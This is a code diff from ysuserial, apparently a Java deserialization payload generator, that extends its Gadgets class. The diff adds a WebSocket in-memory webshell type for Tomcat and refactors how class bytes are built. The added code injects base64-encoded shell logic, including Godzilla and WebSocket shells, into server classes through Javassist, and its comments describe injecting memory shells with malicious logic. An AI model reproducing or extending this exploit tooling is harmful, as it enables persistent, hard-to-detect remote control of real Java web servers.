@@ -3,10 +3,10 @@ package org.su18.ysuserial.payloads.util;
 
 import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
 import static org.su18.ysuserial.payloads.templates.MemShellPayloads.*;
+import static org.su18.ysuserial.payloads.util.Utils.writeClassToFile;
 
 import java.io.ByteArrayOutputStream;
 import java.io.File;
-import java.io.FileOutputStream;
 import java.io.Serializable;
 import java.lang.reflect.*;
 import java.util.HashMap;
@@ -29,9 +29,6 @@ import org.apache.wicket.util.file.Files;
 import org.su18.ysuserial.payloads.templates.memshell.spring.SpringInterceptorMS;
 
 
-/*
- * utility generator functions for common jdk-only gadgets
- */
 @SuppressWarnings({
 		"restriction", "rawtypes", "unchecked"
 })
@@ -125,6 +122,7 @@ public class Gadgets {
 		if (command.startsWith("EX-")) {
 			command = command.substring(3);
 			String type = "";
+			String name = "";
 
 			// 如果命令以 MS 开头，则代表是注入内存马
 			if (command.startsWith("MS-")) {
@@ -135,6 +133,7 @@ public class Gadgets {
 					case "tf":
 					case "tl":
 					case "ts":
+					case "tw":
 						packageName += "tomcat.";
 						break;
 					case "sp":
@@ -156,9 +155,13 @@ public class Gadgets {
 						break;
 				}
 
-				String[] commands = command.split("[-]");
-				String   name     = commands[0];
-				type = command.split("[-]")[1];
+				if (command.contains("-")) {
+					String[] commands = command.split("[-]");
+					name = commands[0];
+					type = command.split("[-]")[1];
+				} else {
+					name = command;
+				}
 
 				clazz = Class.forName(packageName + name, false, Gadgets.class.getClassLoader());
 			} else {
@@ -211,11 +214,10 @@ public class Gadgets {
 		if (myClass != null) {
 			String className = myClass.getName();
 			ctClass = pool.get(className);
-			ctClass.setSuperclass(superClass);
 
 			// 如果是打入 Spring 拦截器类型的内存马，则修改 SpringInterceptorTemplate 创建类字节码，并写入 SpringInterceptorMS 中
 			if (className.contains("SpringInterceptorMS")) {
-
+				ctClass.setSuperclass(superClass);
 				String  target              = "org.su18.ysuserial.payloads.templates.memshell.spring.SpringInterceptorTemplate";
 				CtClass springTemplateClass = pool.get(target);
 				// 类名后加时间戳
@@ -237,9 +239,22 @@ public class Gadgets {
 					ctClass.setName(className + System.nanoTime());
 				}
 
-				// 内存马指定类型进行写入恶意逻辑
-				if (!Objects.equals(cName, "")) {
+				// websocket 型内存马，使用 ClassLoaderTemplate 加载
+				// websocket 型内存马不设置 AbstractTranslet 父类
+				if (className.contains("WSMS")) {
+					insertKeyMethod(ctClass, "ws");
+					bytes = ctClass.toBytecode();
+					cName = ctClass.getName();
+
+					// 写出查看
+//					writeClassToFile(cName, bytes);
+
+					// 内存马指定类型进行写入恶意逻辑
+				} else if (!Objects.equals(cName, "")) {
+					ctClass.setSuperclass(superClass);
 					insertKeyMethod(ctClass, cName);
+				} else {
+					ctClass.setSuperclass(superClass);
 				}
 
 				classBytes = ctClass.toBytecode();
@@ -261,12 +276,8 @@ public class Gadgets {
 			classBytes = ctClass.toBytecode();
 		}
 
-
 		// 写出 class 试试
-		FileOutputStream fileOutputStream = new FileOutputStream("a.class");
-		fileOutputStream.write(classBytes);
-		fileOutputStream.flush();
-		fileOutputStream.close();
+//		writeClassToFile(ctClass.getName(), classBytes);
 
 		// 加载 class 试试
 //		ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
@@ -328,6 +339,10 @@ public class Gadgets {
 				method = "requestInitializedHandle";
 				isTomcat = false;
 				break;
+			} else if (iName.equals("javax.websocket.MessageHandler$Whole")) {
+				method = "onMessage";
+				isTomcat = false;
+				break;
 			}
 		}
 
@@ -363,6 +378,16 @@ public class Gadgets {
 				ctClass.addMethod(CtMethod.make(Utils.base64Decode(AES_FOR_GODZILLA), ctClass));
 
 				insertMethod(ctClass, method, Utils.base64Decode(GODZILLA_RAW_SHELL));
+				break;
+
+			// websocket 内存马
+			case "ws":
+				ctClass.addMethod(CtMethod.make(Utils.base64Decode(TO_CSTRING_Method), ctClass));
+				ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_BY_CLASS), ctClass));
+				ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_AND_INVOKE), ctClass));
+				ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_FIELD_VALUE), ctClass));
+
+				insertMethod(ctClass, method, Utils.base64Decode(WS_SHELL));
 				break;
 			// 命令执行回显内存马
 			case "cmd":
